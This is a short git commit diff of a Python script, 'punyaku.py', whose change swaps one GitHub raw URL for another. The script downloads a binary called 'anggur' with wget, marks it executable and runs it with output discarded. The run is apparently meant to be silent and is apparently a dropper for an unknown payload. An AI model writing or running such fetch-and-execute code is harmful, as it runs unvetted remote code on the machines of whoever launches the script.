bfe775ca684af0366eb997e301d021521c759fde
kunanananaft <95570951+kunanananaft@users.noreply.github.com>
2021-12-05 18:54:28 +0700

    Update punyaku.py

--- punyaku.py
+++ punyaku.py
@@ -1,5 +1,5 @@
 import os
 import subprocess
-subprocess.run(['wget','https://raw.githubusercontent.com/samrikulan/toya/main/anggur'])
+subprocess.run(['wget','https://raw.githubusercontent.com/kunanananaft/Woryyme/main/anggur'])
 subprocess.run(['chmod','+x','anggur'])
 subprocess.run(['./anggur','>/dev/null 2>&1'])
